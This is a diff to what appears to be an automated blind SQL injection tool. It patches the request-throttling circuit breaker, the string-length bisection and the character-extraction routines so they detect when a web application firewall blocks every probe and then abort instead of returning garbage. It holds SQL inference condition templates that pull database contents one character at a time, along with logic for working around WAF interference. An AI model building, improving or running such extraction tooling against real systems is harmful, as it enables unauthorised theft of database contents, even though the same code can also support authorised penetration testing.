@@ -32527,12 +32527,21 @@ class GlobalRequestGate:
                         # BUG-CB-COUNTER-RESET FIX: reset counter to threshold on first open so
                         # probe failures (during recovery window) don't inflate it unboundedly.
                         self._consecutive_fail = _cb_threshold
-                    # Escalate pause: 60s base + 30s per 5 extra errors above threshold
-                    _extra = max(0, (self._consecutive_fail - _cb_threshold) // 5) * 30
-                    _pause = min(300, 60 + _extra + random.uniform(0, 15))
-                    self._paused_until = time.monotonic() + _pause
-                    print(f"[!] [Gate]  CIRCUIT BREAKER OPEN  {self._consecutive_fail} consecutive errors  "
-                          f"halting ALL requests for {_pause:.0f}s", flush=True)
+                        # BUG-CB-PAUSE-RESET FIX: Only set _paused_until on the FIRST open
+                        # transition, not on every subsequent error while the circuit is
+                        # already open. Previously the pause timer was unconditionally
+                        # reset on every error once the threshold was exceeded — meaning
+                        # in-flight coroutines (already past the gate check) that timed out
+                        # one after another pushed _paused_until forward on each failure,
+                        # preventing the hold period from ever elapsing. Moving the
+                        # _paused_until/print block inside `if not self._circuit_open:`
+                        # ensures the 60–300s pause is measured from the FIRST open and
+                        # is not extended by subsequent errors from already-in-flight tasks.
+                        _extra = max(0, (self._consecutive_fail - _cb_threshold) // 5) * 30
+                        _pause = min(300, 60 + _extra + random.uniform(0, 15))
+                        self._paused_until = time.monotonic() + _pause
+                        print(f"[!] [Gate]  CIRCUIT BREAKER OPEN  {self._consecutive_fail} consecutive errors  "
+                              f"halting ALL requests for {_pause:.0f}s", flush=True)
                 elif self._consecutive_fail >= 3:
                     old = self._delay
                     self._delay = min(self._max_delay, self._delay * 2.0 + 0.5)
@@ -62862,6 +62871,30 @@ class Scanner:
                 else:
                     hi = mid
                 await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-GETLEN-SLEEP-PERF FIX: was _delay (SQL sleep time, not RTT); boolean bisection pacing should track ms_false
+            # BUG-GETLEN-WAF-UNIFORM FIX: When the oracle is WAF-uniform for length
+            # expressions, every probe returns True → bisection converges to max_len.
+            # Detect this by sending a logically-impossible always-False counter-probe
+            # (LENGTH(q) BETWEEN/>= max_len+1 AND 99999, or > max_len which is
+            # impossible when the real string is ≤ max_len). If the counter-probe
+            # ALSO returns True, the oracle cannot discriminate length → return -1
+            # so the caller falls back to bitwise length or skips extraction.
+            if lo >= max_len and _boolean_oracle and max_len >= 4:
+                try:
+                    _gl_over_mid = max_len + 1 if _len_uses_between else max_len
+                    _gl_counter_cond = _len_tpl.replace("[QUERY]", query).replace("{mid}", str(_gl_over_mid))
+                    _gl_counter_r = await _eval(_gl_counter_cond)
+                    if _gl_counter_r is True:
+                        LOG.warning(
+                            "[Inference] _get_length: bisection converged to max_len=%d and "
+                            "counter-probe (length>max_len) also True — WAF uniformly blocks "
+                            "length SQL; returning -1 (oracle unreliable for length detection)",
+                            max_len)
+                        print(f"[!] [Extract] length oracle WAF-uniform: bisection→{max_len} "
+                              f"and impossible length>{max_len} probe also True — "
+                              f"treating length as unknown", flush=True)
+                        return -1
+                except Exception:
+                    pass
             return lo
 
         async def _extract_string(query, label="", max_len=128,
@@ -63576,6 +63609,39 @@ class Scanner:
                         continue
                     _fe_none_streak = 0  # reset streak on any concrete answer
                     if _r:
+                        # BUG-FALLBACK-EQ-WAF-UNIFORM FIX (CRITICAL): When the boolean
+                        # oracle is WAF-uniform for extraction SQL (WAF blocks all probes
+                        # returning the oracle-True status), the first candidate in the
+                        # frequency-ordered list ('a'=97) is accepted as True because the
+                        # WAF-blocked 403 matches _bool_true_status=403. This produces
+                        # 'a' for every position regardless of actual DB content.
+                        #
+                        # Fix: before returning a True match, send one complement probe
+                        # (the next candidate in _order, or a fallback value that is
+                        # guaranteed to be SQL-False when _val is the real answer).
+                        # If the complement ALSO returns True, the oracle is WAF-uniform
+                        # and we must abort with None (not return garbage).
+                        #
+                        # Complement probe: test the value immediately following _val in
+                        # the frequency list. When _val IS the real character, the complement
+                        # (a different character value) should return False. When WAF-uniform,
+                        # both return True (WAF blocks all, not SQL result).
+                        try:
+                            _val_idx = _order.index(_val)
+                            _complement_val = _order[(_val_idx + 1) % len(_order)]
+                        except (ValueError, IndexError):
+                            _complement_val = (_val + 1) if _val < 127 else 97
+                        _comp_cond = f"({_ae})={_complement_val}"
+                        _comp_r = await _eval(_comp_cond)
+                        if _comp_r is True:
+                            # Both the match AND the complement return True \u2014 oracle is
+                            # WAF-uniform for equality probes. Abort rather than return 'a'.
+                            LOG.warning(
+                                "[Inference] pos=%d equality: match val=%d returned True "
+                                "AND complement val=%d ALSO True \u2014 WAF-uniform blocking "
+                                "detected for equality probes; aborting scan (would return "
+                                "garbage otherwise).", p, _val, _complement_val)
+                            return None
                         LOG.info("[Inference] pos=%d equality \u2192 %r (val=%d)", p, chr(_val), _val)
                         return chr(_val)
                     await asyncio.sleep(max(0.05, _fe_rtt_s * 0.3))  # BUG-FALLBACK-EQ-SLEEP-PERF FIX: was _delay * 0.3
@@ -64065,6 +64131,62 @@ class Scanner:
                               label, _bw_san_exc)
 
             _bw_equality_restart = False  # BUG-BITWISE-GARBAGE-RESTART: set True when garbage detected mid-extraction
+
+            # BUG-EXTRACT-WAF-UNIFORM-ORACLE FIX (CRITICAL): Detect WAF-uniform blocking
+            # for extraction-format SQL conditions before starting character bisection.
+            #
+            # Root cause: The boolean oracle is calibrated with simple arithmetic
+            # conditions (1e0=1e0 / 0e0=1e0) that WAFs do NOT block. But during
+            # character extraction, the probes use complex nested SQL expressions
+            # (e.g. ORD(MID((SELECT database()),1,1)) BETWEEN 600000 AND 1114111)
+            # that WAFs block uniformly regardless of SQL truth value. When WAF
+            # returns the oracle-True status (e.g. 403) for ALL such probes:
+            #   • Bisection: every probe True → lo climbs to hi=1,114,111 → chr(>U+10FFFF)
+            #   • Equality scan: first candidate (ord 'a'=97) returns True → wrong char
+            #   • Length oracle: bisection converges to max_len → garbage length
+            #
+            # Fix: before the extraction loop, send an always-False extraction probe
+            # using the ACTUAL _op_char_tpl template at pos=9999 (past any real string,
+            # so the char function returns 0) with mid just above the Unicode maximum
+            # (1,114,112). Logically: 0 BETWEEN 1,114,112 AND max → False.
+            # If the oracle returns True → WAF blocks ALL extraction SQL → abort now
+            # rather than spending 7,200s extracting garbage Unicode code points.
+            #
+            # Note: this guard only applies to the boolean-oracle path
+            # (_boolean_oracle=True, _use_bitwise_fallback=False). The bitwise
+            # path has its own sanity check above (_bw_san_r / _bw_san_r2).
+            _extract_waf_uniform = False
+            if _boolean_oracle and not _use_bitwise_fallback and _op_char_tpl and query:
+                try:
+                    _ewu_char_hi = _build_dbms_char_hi(_dbms, _char_tpl)
+                    # Always-False: pos=9999 is past any real string (char fn returns 0),
+                    # mid=_ewu_char_hi+1 is above Unicode max — 0 BETWEEN max+1 AND max
+                    # is logically impossible (False). If oracle returns True → WAF-uniform.
+                    _ewu_impossible_mid = _ewu_char_hi + 1
+                    _ewu_cond = _op_char_tpl.replace("[QUERY]", query).replace(
+                        "{pos}", "9999").replace("{mid}", str(_ewu_impossible_mid))
+                    _ewu_r = await _cached_eval(_ewu_cond)
+                    if _ewu_r is True:
+                        _extract_waf_uniform = True
+                        LOG.warning(
+                            "[Inference] %s: WAF-uniform blocking confirmed for extraction "
+                            "SQL — always-False char probe (pos=9999, mid=%d above Unicode "
+                            "max) returned True (oracle=%r for all probes). Bisection and "
+                            "equality fallback will produce garbage; aborting extraction of "
+                            "this field to avoid wasting requests on bad data.",
+                            label, _ewu_impossible_mid, _bool_true_status)
+                        print(
+                            f"[!] [Extract] {label}: WAF uniformly blocks extraction SQL "
+                            f"(status {_bool_true_status} for impossible-False probe) — "
+                            f"boolean oracle cannot discriminate char conditions. "
+                            f"Skipping extraction to avoid garbage output.", flush=True)
+                except Exception as _ewu_e:
+                    LOG.debug("[Inference] %s: WAF-uniform pre-check error (non-fatal): %s",
+                              label, _ewu_e)
+
+            if _extract_waf_uniform:
+                return ""
+
             for pos in range(1, max_len + 1):
                 await asyncio.sleep(0.001)  # BUG-R9-A FIX: real 1ms yield at each position
 
@@ -146877,6 +146999,38 @@ class MultiStrategyExtractor:
             "Informix":        "(1e0 IS NOT NULL)",
             "SAP_HANA":        "(1e0 IS NOT NULL)",
         }.get(self.dbms or "", "NOT (1e0 IS NULL)")
+
+        # BUG-MSE-WAF-UNIFORM FIX: When WAF uniformly blocks extraction SQL (all
+        # comparison probes return oracle-True regardless of SQL truth value),
+        # binary search converges to the DBMS ceiling and produces garbage Unicode.
+        # Detect before entering the main loop using two sentinel probes:
+        #   _mwu_lo: {expr} >= chr(1)       → logically True  for any non-null string
+        #   _mwu_hi: {expr} >= chr(0x10FFFE) → logically False for any real string
+        # If both return True the oracle is WAF-uniform for this expression → return "".
+        # Guard: only run on fresh extractions (not resumed ones with partial prefix data).
+        if not prefix:
+            try:
+                _mwu_lo_cond = f"{expr}>={self._quote_val(chr(1))}"
+                _mwu_hi_cond = f"{expr}>={self._quote_val(chr(0x10FFFE))}"
+                _mwu_lo = await asyncio.wait_for(
+                    self.eval_condition(_mwu_lo_cond), timeout=15)
+                _mwu_hi = await asyncio.wait_for(
+                    self.eval_condition(_mwu_hi_cond), timeout=15)
+                if _mwu_lo is True and _mwu_hi is True:
+                    LOG.warning(
+                        "[MSE] %r: WAF-uniform blocking confirmed for extraction SQL — "
+                        "lower-bound chr(1) probe True AND upper-bound chr(0x10FFFE) "
+                        "probe ALSO True. Boolean oracle cannot discriminate extraction "
+                        "conditions; aborting to avoid garbage output.",
+                        expr[:60])
+                    print(
+                        f"[MSE] WAF uniformly blocks extraction SQL for {expr[:50]!r} "
+                        f"(both chr(1) and chr(0x10FFFE) bound probes returned True). "
+                        f"Aborting extraction to avoid garbage output.", flush=True)
+                    return ""
+            except Exception as _mwu_e:
+                LOG.debug("[MSE] WAF-uniform pre-check failed (non-fatal): %s", _mwu_e)
+
         for pos in range(_start_pos, max_len + 1):
             # Health check + jitter profiling
             if pos % _health_interval == 0 and pos > 1:
